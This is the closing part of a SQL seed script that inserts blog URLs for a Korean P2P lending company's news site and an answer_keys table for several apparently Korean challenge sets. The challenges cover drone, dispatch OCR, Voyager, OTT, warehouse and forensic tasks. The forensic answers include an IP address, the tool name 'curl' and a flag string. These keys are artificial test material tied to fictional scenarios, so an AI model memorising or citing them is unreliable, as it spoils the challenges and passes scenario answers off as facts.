  ('pfct-news-url-091', 'pfct-news', 'https://blog.pfct.co.kr/how-to-find-success-in-p2p-loan-investment-1'),
  ('pfct-news-url-092', 'pfct-news', 'https://blog.pfct.co.kr/how-to-find-success-in-p2p-loan-investment-2'),
  ('pfct-news-url-093', 'pfct-news', 'https://blog.pfct.co.kr/how-to-manage-credit-score'),
  ('pfct-news-url-094', 'pfct-news', 'https://blog.pfct.co.kr/how-to-manage-debt'),
  ('pfct-news-url-095', 'pfct-news', 'https://blog.pfct.co.kr/how-will-the-interest-rate-on-credit-loans-be-determined'),
  ('pfct-news-url-096', 'pfct-news', 'https://blog.pfct.co.kr/iclr2025'),
  ('pfct-news-url-097', 'pfct-news', 'https://blog.pfct.co.kr/iclr2025-interview'),
  ('pfct-news-url-098', 'pfct-news', 'https://blog.pfct.co.kr/iflr-asia-pacific-awards-2020'),
  ('pfct-news-url-099', 'pfct-news', 'https://blog.pfct.co.kr/impact-of-credit-score'),
  ('pfct-news-url-100', 'pfct-news', 'https://blog.pfct.co.kr/importance-of-partner-bank');

-- =============================================================================
-- Answer Keys
-- =============================================================================

INSERT INTO answer_keys (question_id, answer) VALUES
  -- PFCT Blog 정답
  ('pfct-news-q1', '37'),
  ('pfct-news-q2', '384'),
  ('pfct-news-q3', '채권-투자의-매력'),
  ('pfct-news-q4', '11'),
  ('pfct-news-q5', 'ai-lab'),
  -- 배차 챌린지 정답
  ('pfct-ocr-q1', '4건'),
  ('pfct-ocr-q2', '정스피드 > 김철수 > 이영희 > 박민수 > 최신속'),
  ('pfct-ocr-q3', '서초구'),
  ('pfct-ocr-q4', '라이더의 최대 적재 용량 초과'),
  ('pfct-ocr-q5', '정스피드 > 김철수 > 최신속 > 이영희 = 박민수'),
  -- 드론 챌린지 정답
  ('drone-q1', '적절한 판단: 생명체 식별 및 안전거리 미확보로 정지함'),
  ('drone-q2', '표면 스캔 결과 불안정(UNSTABLE) - 장애물 감지'),
  ('drone-q3', '즉시 복귀 명령 (시각 센서 신뢰도 저하)'),
  -- 보이저 신호 해독 정답
  ('voyager-q1', '39.60'),
  ('voyager-q2', '3'),
  ('voyager-q3', 'X:127 Y:891 Z:2049'),
  -- OTT 분석 정답
  ('ott-q1', 'SF > 스릴러 > 액션'),
  ('ott-q2', '배우C'),
  ('ott-q3', '94.7'),
  -- 물류 로봇 정답
  ('warehouse-q1', '10'),
  ('warehouse-q2', '12'),
  ('warehouse-q3', '4,4'),
  -- 포렌식 챌린지 정답
  ('forensic-q1', '203.0.113.42'),
  ('forensic-q2', '780'),
  ('forensic-q3', 'curl'),
  ('forensic-q4', '0x3f_Start_Middle_777_End_Code_X'),
  ('forensic-q5', 'SEC_PARK (오른손잡이)');

COMMIT;

